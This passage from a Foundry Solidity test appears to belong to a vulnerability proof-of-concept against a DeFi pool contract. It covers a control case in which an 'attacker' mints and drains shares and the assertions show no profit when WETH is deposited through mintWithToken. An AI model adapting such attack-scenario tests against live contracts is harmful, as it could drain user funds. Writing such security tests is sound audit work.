        console2.log("==== CONTROL: accounted via mintWithToken");
        address pool3 = _createFreshUsdcPool("StrayCtl", "STRY3");
        vm.prank(poolOwner);
        ISmartPoolOwnerActions(pool3).setAcceptableMintToken(Constants.ETH_WETH, true);
        deal(Constants.ETH_WETH, poolOwner, 50e18); // pulled from the owner by mintWithToken...
        vm.startPrank(poolOwner);
        IERC20(Constants.ETH_WETH).approve(pool3, 50e18);
        ISmartPoolActions(pool3).mintWithToken(poolOwner, 50e18, 0, Constants.ETH_WETH); // ...accounted
        vm.stopPrank();
        uint256 uCtlBefore = _u(pool3);
        uint256 principal3 = uint256(IEOracle(pool3).convertTokenAmount(Constants.ETH_WETH, 1e18, Constants.ETH_USDC));
        deal(Constants.ETH_USDC, attacker, principal3);
        vm.startPrank(attacker);
        IERC20(Constants.ETH_USDC).approve(pool3, principal3);
        ISmartPool(payable(pool3)).mint(attacker, principal3, 0);
        vm.stopPrank();
        assertApproxEqAbs(_u(pool3), uCtlBefore, 500, "control: no u jump - the WETH value is share-backed");
        _warpPastLockup(pool3);
        (uint256 ctlWethOut, uint256 ctlUsdcOut, ) = _drainShares(attacker, pool3);
        uint256 ctlValueOut = ctlUsdcOut +
            uint256(IEOracle(pool3).convertTokenAmount(Constants.ETH_WETH, int256(ctlWethOut), Constants.ETH_USDC));
        int256 ctlProfit = int256(ctlValueOut) - int256(principal3);
        console2.log("  control attacker value out (raw):", ctlValueOut);
        console2.log("  control attacker profit (raw):", ctlProfit);
        assertEq(ctlWethOut, 0, "control: the attacker captures ZERO WETH");
        assertLe(ctlProfit, 0, "control: he recovers at most his own principal (spread costs only)");
    }
}
